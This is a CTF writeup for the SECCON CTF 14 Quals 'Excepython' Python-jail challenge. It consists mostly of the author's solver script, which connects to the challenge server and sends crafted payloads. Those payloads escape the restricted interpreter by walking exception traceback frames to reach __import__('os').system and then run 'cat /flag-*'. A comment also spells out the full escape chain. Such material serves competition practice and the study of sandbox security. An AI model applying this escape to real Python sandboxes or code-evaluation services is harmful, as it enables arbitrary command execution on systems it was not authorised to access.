---
title: "Excepython - SECCON CTF 14 Quals 2025"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "excepython", "misc", "seccon-ctf-14-quals"]
summary: "Exception-Oriented Programming"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/excepython"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Quals"
  year: 2025
  challenge: "Excepython"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/excepython>
- **CTF:** SECCON CTF 14 Quals 2025

---

# [jail] excepython

## Description

Exception-Oriented Programming

```
nc excepython.seccon.games 5000
```

## Attachments

- [excepython](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=5000 \
    --network=host \
    (docker build -q ./solution)
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/excepython/solution/solve.py>

```python
import ptrlib
import os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

io.sendlineafter(
    "jail> ",
    r"""
    "{0\x2e__class__\x2e__base__\x2e__getattribute__\x2ex}".format([])
    """.strip(),
)

# ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("cat /f*")

io.sendlineafter(
    "jail> ",
    """
    [f := ex.obj] and
    [o := ex] and
    [
        [
            [[k := "__traceback__"] and [g := f]] if i == 0 else
            [[k := "tb_frame"] and [g := f]] if i == 1 else
            [[k := "f_builtins"] and [g := f]] if i == 2 else
            [[g := o["__import__"]] and [o := "os"]] if i == 3 else
            [[k := "system"] and [g := f]] if i == 4 else
            [[k := "x"] and [g := f]]
        ] and [o := g(o, k)]
        for i in {0} | {1} | {2} | {3} | {4} | {5}
    ]
    """.strip().replace(
        "\n", " "
    ),
)

io.sendlineafter(
    "jail> ",
    """
    ex.obj("cat /flag-*")
    """.strip(),
)

print(io.recvline().decode().strip())
```
